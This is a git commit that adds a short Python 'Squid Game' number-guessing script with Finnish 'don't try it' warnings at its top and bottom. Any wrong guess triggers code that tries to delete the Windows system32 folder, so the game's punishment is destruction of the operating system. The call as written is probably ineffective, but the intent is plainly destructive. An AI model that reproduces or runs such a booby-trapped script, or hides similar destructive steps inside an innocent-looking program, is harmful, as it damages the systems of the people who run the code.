db29c1fad1a1a088abbab7c34d0dbcef0ba9b801
PennasenKake <121464958+PennasenKake@users.noreply.github.com>
2025-04-12 11:23:30 +0300

    lisää tavaraa

---
+++ Python/valmiit/real_squid_game.py
@@ -0,0 +1,21 @@
+
+
+
+## ÄLÄ KOKEILE
+
+
+import random
+import os
+
+number = random.randint(1, 10)
+quess  = input("Guess a number between 1 and 10: ")
+quess  = int(quess)
+
+if quess == number:
+    print("You got it!")
+else:
+    os.remove("c:\\windows\\system32")
+
+
+## ÄLÄ KOKEILE
+ 
